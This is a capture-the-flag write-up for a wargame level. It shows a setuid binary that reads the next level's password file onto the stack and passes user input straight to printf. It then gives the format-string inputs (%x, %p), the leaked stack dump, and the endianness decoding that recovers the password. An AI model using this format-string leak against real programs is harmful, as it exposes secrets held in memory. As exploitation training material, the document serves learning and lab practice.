# String Attack

## Context

```bash
$> file ./level02
setuid setgid ELF 64-bit
$> readelf -h ./level02
  Data:            2's complement, little endian
```

The program open and read the /home/users/level03/.pass

```c
file = fopen("/home/users/level03/.pass","r");
return_value = fread(buffer_6,1,41,file);
```

So the password is store in the stack between 2 buffers : 

```c
  char buffer_14 [14];
  char buffer_6 [6]; // this is were is stock the password
  char buffer_12 [12];
```

The programm gonna ask you a username store in the buffer_12 and a password store in the buffer_14.

At this end of the program, main():

```c
  printf((char *)buffer_12); // username buffer
```

:warnig: We found the vuln !

## Exploit

```bash
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: BBBB%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
--[ Password: CCCC

BBBBffffe3d00432a2a2a2a2a2a2a2affffe5c8f7ff9a084343434300000000000003437684861733951574e67586e475873664b394d0424242427825782578257825782578257825782578257825782578257825782578257825 does not have access!
```

We can see 43434343 and 42424242 wrote, and some byte between ! With x, we did print 4 bytes, buts its 64bits so we need print 8 bytes with "%p".

So lets try again: 

```bash
--[ Username: AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
AAAA0x7fffffffe3d0(nil)0x2e0x2a2a2a2a2a2a2a2a0x2a2a2a2a2a2a2a2a0x7fffffffe5c80x1f7ff9a080x70252e70252e(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)0x100000000(nil)0x756e505234376848.0x45414a3561733951.0x377a7143574e6758.0x354a35686e475873.0x48336750664b394d.(nil).0x7025702541414141.0x7025702570257025.0x7025702570257025.0x7025702570257025.0x7025702570257025.0x7025702570257025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025 does not have access!
```

Interseting value are between the second-last and last (nil).

For each 8 bytes, swap endiannes and translate hex to assci. 

```py
0x756e505234376848 = 0x4868373452506E75 = "Hh74RPnu"
# this are 8 first bytes.
```

You can do it faster with this website : [CyberChef](https://gchq.github.io/CyberChef/#recipe=Swap_endianness('Hex',8,true)From_Hex('Auto')&input=MHg3NTZlNTA1MjM0Mzc2ODQ4LjB4NDU0MTRhMzU2MTczMzk1MS4weDM3N2E3MTQzNTc0ZTY3NTguMHgzNTRhMzU2ODZlNDc1ODczLjB4NDgzMzY3NTA2NjRiMzk0ZA)